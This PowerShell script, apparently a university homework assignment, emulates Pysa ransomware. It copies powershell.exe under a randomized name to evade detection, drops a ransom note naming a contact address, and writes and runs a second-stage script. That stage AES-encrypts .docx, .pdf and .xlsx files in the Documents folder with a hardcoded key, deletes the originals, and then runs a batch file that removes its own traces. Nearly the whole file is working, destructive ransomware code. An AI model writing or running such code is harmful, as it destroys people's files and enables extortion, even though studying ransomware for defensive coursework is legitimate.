<#
    This step creates a copy of the Powershell executable,
    and obfuscates the name to decrease chance of detection.
    It also drops a ransom note, drops step 2, and executes step 2.
#>

# Create randomized name for target file
$file = $env:USERPROFILE + "\EnNoB-" + (Get-Random -Minimum 1000 -Maximum 9876) + ".exe"

# Copy Powershell executable to target file
Copy-Item -Path "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination $file

# Check to see if target file exists
if (Test-Path $file) {
    Write-Host -ForegroundColor "Green" "[+] Copied Powershell executable was found. File path is: $file"
}
else {
    Write-Host -ForegroundColor "Red" "[!] Copied Powershell executable was not found!"
}

# Create ransom note
$notePath = $env:USERPROFILE + "\Desktop\Readme.READ"

"If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you." | `
    Out-File -FilePath $notePath

# Check to see if ransom note exists
if (Test-Path $notePath) {
    Write-Host -ForegroundColor "Green" "[+] Ransom note was found."
}
else {
    Write-Host -ForegroundColor "Red" "[!] Ransom note was not found!"
}

$step2 = @'
# Source: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
# Encrypts file
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) { $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text) }
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) { return [System.Convert]::ToBase64String($encryptedBytes) }
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) { $cipherBytes = [System.Convert]::FromBase64String($Text) }
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) { return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0) }
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

# Get list of child items in Documents
Get-ChildItem -Recurse -Include *.docx, *.pdf, *.xlsx -Path .\Documents | Export-Csv `
    -Path files.csv

# Import CSV file.
$fileList = Import-Csv -Path .\files.csv # -Header FullName

# Loop through the results
foreach ($f in $fileList) {

    # First encrypt the file
    Invoke-AESEncryption -Mode Encrypt -Key "SuperS3cur3PysaP@ssword" -Path $f.FullName

    # Then remove the unencrypted version
    Remove-Item -Path $f.FullName

}

# Contents of update.bat
$updateBat = @"
@ECHO OFF
DEL step2.ps1
DEL files.csv
"@

# Directory in which to write update.bat (destination)
$sbDir = 'D:\school-files\SYS320-SP22\Week12\homework\'

# Create the filename
$file = $sbDir + "update.bat"

# Write to a file
$updateBat | Out-File -FilePath $file

# Executes the dropped batch file
Start-Process -FilePath $file
'@

# Directory in which to write step2 (destination)
$sbDir = 'D:\school-files\SYS320-SP22\Week12\homework\'

# Create the file and location to save step2
$file = $sbDir + "step2.ps1"

# Write to a file
$step2 | Out-File -FilePath $file

# Executes the dropped script
Invoke-Expression $file
